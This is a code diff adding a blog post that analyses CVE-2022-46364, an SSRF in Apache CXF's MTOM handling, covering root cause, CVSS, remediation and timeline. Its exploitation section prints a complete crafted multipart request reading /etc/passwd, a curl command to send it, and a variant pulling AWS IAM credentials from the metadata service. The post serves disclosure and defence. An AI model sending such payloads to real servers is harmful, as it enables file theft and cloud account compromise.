@@ -145,6 +145,209 @@ function copyLink() {
 
 const posts = ref([
   {
+    id: 3,
+    title: 'CVE-2022-46364: Critical SSRF in Apache CXF via MTOM XOP:Include',
+    excerpt: 'Analysis of a critical unauthenticated Server-Side Request Forgery (CWE-918) in Apache CXF\'s MTOM implementation. An attacker embedding a crafted XOP:Include href forces the server to issue arbitrary HTTP or file:// requests, leaking internal resources and cloud metadata credentials with zero prerequisites.',
+    date: 'December 2022',
+    category: 'CVE Analysis',
+    cvss: '9.8',
+    author: 'julichaan',
+    readTime: '12 min read',
+    tags: ['CVE-2022-46364', 'SSRF', 'Apache CXF', 'MTOM', 'SOAP', 'CWE-918', 'Java', 'LFI'],
+    content: [
+      {
+        type: 'callout', variant: 'info',
+        text: 'CVE-2022-46364 · CVSS 9.8 (CRITICAL) · CWE-918 Server-Side Request Forgery · Apache CXF < 3.4.10 / < 3.5.5 · Published: December 13, 2022 · Discovered by: thanat0s (360 adlab)'
+      },
+      {
+        type: 'h2', text: '1. Overview'
+      },
+      {
+        type: 'p',
+        text: 'CVE-2022-46364 is a critical-severity Server-Side Request Forgery (SSRF) vulnerability in <strong>Apache CXF</strong>, a widely deployed open-source Java framework used for building and consuming SOAP and REST services. The vulnerability resides in the MTOM (Message Transmission Optimization Mechanism) request handling layer and affects all Apache CXF versions prior to <code>3.4.10</code> and the entire <code>3.5.x</code> branch prior to <code>3.5.5</code>. A remote unauthenticated attacker can exploit <em>any</em> publicly reachable CXF endpoint — with zero prerequisites beyond network access — to trigger arbitrary outbound requests from the server, read local files, or pivot into otherwise unreachable internal systems. The CVSS 3.1 base score is <strong>9.8 (CRITICAL)</strong>, reflecting the complete absence of authentication, user interaction, or complex pre-conditions.'
+      },
+      {
+        type: 'h2', text: '2. Technical Background: MTOM, XOP, and How Apache CXF Handles Them'
+      },
+      {
+        type: 'p',
+        text: '<strong>MTOM (Message Transmission Optimization Mechanism)</strong> is a W3C standard that optimises the transport of binary data embedded in SOAP messages. Instead of base64-encoding binary payloads inline — expensive in both size and CPU cycles — MTOM splits the message into a multipart MIME package: one part carries the SOAP envelope, and additional parts carry the binary attachments. Within the SOAP body, a placeholder element from the <strong>XOP (XML-binary Optimized Packaging)</strong> specification — <code>&lt;xop:Include&gt;</code> — references each attachment via a <code>href</code> attribute.'
+      },
+      {
+        type: 'p',
+        text: 'In a well-formed MTOM message, that <code>href</code> attribute contains a <code>cid:</code> (Content-ID) URI that resolves to one of the MIME parts within the same request. The XOP specification deliberately leaves URI scheme choice to the consuming application. In vulnerable versions of Apache CXF, the MTOM parser resolves <em>whatever</em> URI appears in the <code>href</code> attribute without any scheme validation. Values such as <code>http://internal-host/</code>, <code>https://169.254.169.254/</code>, or <code>file:///etc/passwd</code> are silently accepted and resolved server-side.'
+      },
+      {
+        type: 'table',
+        headers: ['href URI Scheme', 'Server Behaviour', 'Attacker Outcome'],
+        rows: [
+          ['cid: (standard)', 'Resolves to a MIME attachment in the same request', 'Intended — no security impact'],
+          ['http:// / https://', 'Performs an outbound HTTP request to the supplied URL', 'SSRF — internal network access, cloud metadata theft'],
+          ['file://', 'Reads the specified path from the local filesystem', 'LFI — arbitrary file read with server process privileges'],
+        ]
+      },
+      {
+        type: 'p',
+        text: 'What elevates this vulnerability is the <strong>breadth of the attack surface</strong>: the MTOM code path is triggered whenever CXF processes a multipart SOAP request with the appropriate content type. This means every CXF service that accepts at least one parameter is vulnerable — regardless of its WSDL schema, business logic, or authentication configuration. The framework is the vulnerability, not any specific service configuration.'
+      },
+      {
+        type: 'h2', text: '3. Root Cause Analysis: Missing URI Scheme Validation in MTOM Attachment Resolution'
+      },
+      {
+        type: 'p',
+        text: 'During MTOM parsing, Apache CXF\'s attachment handling code encounters each <code>&lt;xop:Include&gt;</code> element and must resolve the value of its <code>href</code> attribute to recover the corresponding bytes. In the vulnerable codebase, the resolution logic passes the attacker-controlled URI directly into the Java HTTP client stack — or the local filesystem handler, for <code>file://</code> URIs — without first verifying whether the URI scheme is a permitted <code>cid:</code> reference.'
+      },
+      {
+        type: 'p',
+        text: 'The vulnerable execution path is approximately: <em>parse multipart body → encounter <code>&lt;xop:Include href="..."&gt;</code> → resolve href directly → return resolved bytes to the service layer</em>. When the <code>href</code> contains a <code>cid:</code> reference, resolution is local and safe — it locates the matching MIME part within the same request. When it contains an external URI, resolution becomes a network or filesystem operation triggered with the server\'s own credentials and network identity. The vulnerable code made no distinction between these two cases.'
+      },
+      {
+        type: 'callout', variant: 'warn',
+        text: 'The flaw is not in the MTOM or XOP specifications themselves — it is in the implementation\'s failure to enforce that XOP:Include href values are restricted to the cid: scheme when processing untrusted input. Any external URI scheme resolved from attacker-controlled data in a server-side context is an SSRF by design.'
+      },
+      {
+        type: 'h2', text: '4. Exploitation'
+      },
+      {
+        type: 'p',
+        text: 'The attack is self-contained in a single HTTP request. The attacker sends a crafted multipart MTOM/SOAP message to any reachable CXF endpoint; the server resolves the attacker-supplied URI and returns the retrieved content base64-encoded inside the SOAP response body. Below, each phase of the attack is examined in detail.'
+      },
+      {
+        type: 'h3', text: 'Phase 1 — Identifying a Vulnerable CXF Endpoint'
+      },
+      {
+        type: 'p',
+        text: 'Any HTTP endpoint serving SOAP requests through Apache CXF qualifies. Common fingerprints include a WSDL descriptor accessible at <code>?wsdl</code>, response envelopes containing CXF-specific namespace declarations, or HTTP server headers identifying the application server. Products such as WildFly, JBoss EAP, and Red Hat SSO ship CXF as their bundled JAX-WS provider and are vulnerable in the affected version ranges. No knowledge of the service\'s intended interface is required — the MTOM code path triggers before the payload is validated against any service contract.'
+      },
+      {
+        type: 'h3', text: 'Phase 2 — Crafting the Malicious MTOM Payload'
+      },
+      {
+        type: 'p',
+        text: 'The request is a standard multipart HTTP POST with <code>Content-Type: multipart/related; type="application/xop+xml"</code>. The SOAP body contains a minimal envelope with a single parameter of any accepted type. Nested inside the parameter is the <code>&lt;xop:Include&gt;</code> element with the target URI in its <code>href</code> attribute. The SOAP service schema does not need to be known — a generic envelope structure suffices to trigger the vulnerable parsing path.'
+      },
+      {
+        type: 'code',
+        text:
+`POST /EmployeeService HTTP/1.1
+Host: target.example.com:8080
+Content-Type: multipart/related;
+  type="application/xop+xml";
+  boundary="----=_Part_1";
+  start="<root.message@cxf.apache.org>";
+  start-info="text/xml"
+
+------=_Part_1
+Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
+Content-Transfer-Encoding: 8bit
+Content-ID: <root.message@cxf.apache.org>
+
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <ns2:getEmployee xmlns:ns2="http://service.example/">
+      <arg0>
+        <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include"
+          href="file:///etc/passwd"/>
+      </arg0>
+    </ns2:getEmployee>
+  </soap:Body>
+</soap:Envelope>
+------=_Part_1--`
+      },
+      {
+        type: 'p',
+        text: 'Replacing <code>file:///etc/passwd</code> with <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> shifts the attack from local file inclusion to cloud metadata SSRF — silently requesting AWS IAM role credentials from the EC2 instance metadata service. The payload structure is identical regardless of the target URI scheme.'
+      },
+      {
+        type: 'h3', text: 'Phase 3 — Sending the Request and Decoding the Exfiltrated Content'
+      },
+      {
+        type: 'p',
+        text: 'The server processes the MTOM request, resolves the <code>href</code> URI using its own network identity and filesystem access, and returns the retrieved bytes base64-encoded within the SOAP response body. The attacker extracts and decodes the payload locally.'
+      },
+      {
+        type: 'code',
+        text:
+`# Send the crafted MTOM request
+curl -s -X POST "http://target.example.com:8080/EmployeeService" \\
+  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="----=_Part_1"; start="<root.message@cxf.apache.org>"; start-info="text/xml"' \\
+  --data-binary @payload.txt > response.xml
+
+# Extract and decode the base64-encoded exfiltrated content
+grep -oP '(?<=<return>)[^<]+' response.xml | base64 -d`
+      },
+      {
+        type: 'p',
+        text: 'For <code>file:///etc/passwd</code>, the decoded output is the raw content of the server\'s <code>/etc/passwd</code> file. For a cloud metadata URI, it is a JSON credential object containing the IAM role\'s <code>AccessKeyId</code>, <code>SecretAccessKey</code>, and session <code>Token</code> — valid AWS credentials for the instance role, exploitable in subsequent API calls against the AWS control plane.'
+      },
+      {
+        type: 'callout', variant: 'warn',
+        text: 'The cloud metadata SSRF vector is particularly high-impact in containerised or serverless deployments. If the instance role carries permissions to call IAM, SSM, S3, or EC2 APIs, credential theft via this single request can chain directly into full account compromise without any further interaction with the vulnerable CXF service.'
+      },
+      {
+        type: 'h2', text: '5. CVSS 3.1 Vector Breakdown'
+      },
+      {
+        type: 'p',
+        text: 'The assigned vector is <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code>, yielding a base score of <strong>9.8 (CRITICAL)</strong>.'
+      },
+      {
+        type: 'table',
+        headers: ['Metric', 'Value', 'Rationale'],
+        rows: [
+          ['Attack Vector', 'Network (N)', 'Exploitable over the network from any remote host with access to the CXF endpoint'],
+          ['Attack Complexity', 'Low (L)', 'A single crafted HTTP request suffices; no race conditions, special configuration, or target fingerprinting required'],
+          ['Privileges Required', 'None (N)', 'No credentials or prior access to the application are needed'],
+          ['User Interaction', 'None (N)', 'No victim action is required; the server silently resolves the supplied URI on receipt of the request'],
+          ['Scope', 'Unchanged (U)', 'Attacker operates within the CXF process security context throughout'],
+          ['Confidentiality', 'High (H)', 'Arbitrary file reads and internal HTTP responses fully disclosed to the attacker'],
+          ['Integrity', 'High (H)', 'Achievable via SSRF pivot to internal writable services (cloud control plane, management APIs)'],
+          ['Availability', 'High (H)', 'Server-side resource exhaustion possible via recursive or large-payload resolution targets'],
+        ]
+      },
+      {
+        type: 'h2', text: '6. Affected Versions and Remediation'
+      },
+      {
+        type: 'ul',
+        items: [
+          '<strong>Affected:</strong> Apache CXF — all versions &lt; 3.4.10',
+          '<strong>Affected:</strong> Apache CXF 3.5.0 through 3.5.4 (i.e., all &lt; 3.5.5)',
+          '<strong>Patched:</strong> Apache CXF 3.4.10 and Apache CXF 3.5.5',
+          '<strong>Downstream products:</strong> Red Hat JBoss EAP and Red Hat Single Sign-On shipped affected CXF versions — Red Hat issued separate security advisories for both',
+        ]
+      },
+      {
+        type: 'p',
+        text: 'The fix introduces URI scheme validation within the MTOM attachment resolution path: only <code>cid:</code> references pointing to MIME parts within the same request are permitted. All external URI schemes (<code>http://</code>, <code>https://</code>, <code>file://</code>, and others) are rejected before any network or filesystem access is attempted, regardless of what the service schema permits. No service-level configuration changes are required alongside the upgrade.'
+      },
+      {
+        type: 'callout', variant: 'info',
+        text: 'If immediate patching is not possible: disable MTOM support at the gateway or application layer if not required by the business. Enforce egress filtering on the CXF host to restrict outbound HTTP to explicitly whitelisted destinations. Block access to cloud metadata IP ranges (169.254.169.254, 169.254.170.2) from all application servers as a baseline defence-in-depth measure regardless of patching status.'
+      },
+      {
+        type: 'h2', text: '7. Disclosure Timeline'
+      },
+      {
+        type: 'table',
+        headers: ['Date', 'Event'],
+        rows: [
+          ['December 13, 2022', 'CVE-2022-46364 published — Apache CXF Security Advisory released publicly'],
+          ['December 2022', 'Apache CXF 3.4.10 and 3.5.5 released with the patch applied'],
+          ['December 2022', 'Red Hat issues separate advisories for affected JBoss EAP and Red Hat SSO versions'],
+          ['April 21, 2025', 'NVD record last modified'],
+        ]
+      },
+      {
+        type: 'h2', text: '8. Conclusion'
+      },
+      {
+        type: 'p',
+        text: 'CVE-2022-46364 is a clean and instructive example of how standard, well-specified protocol mechanisms become critical attack surfaces when implemented without input validation. MTOM and XOP are legitimate W3C specifications — the vulnerability is not in the standard, but in the assumption that a <code>href</code> attribute derived from an untrusted HTTP request can be safely resolved without restricting its scheme. The result is a zero-authentication, network-reachable SSRF that reduces to arbitrary file read in its simplest form and escalates to cloud credential theft and internal network pivoting in realistic production deployments. The breadth of the attack surface — every CXF endpoint, no schema knowledge required — is precisely what justifies the 9.8 score. The fix is a single validation gate; the lesson is broader: any time server-side code resolves a URI from attacker-controlled input, the permitted scheme set must be explicitly and narrowly whitelisted at the point of resolution.'
+      },
+    ]
+  },
+  {
     id: 2,
     title: 'RootedCon 2026: Three Days at the Edge of What AI Has Already Done',
     excerpt: 'XVI edition, Kinépolis Madrid. The conference opened with a Pac-Man video generated by AI — and never let you forget the irony. Notes from three days of technical talks, uncomfortable truths, and the corridors of one of Europe\'s most important security conferences.',
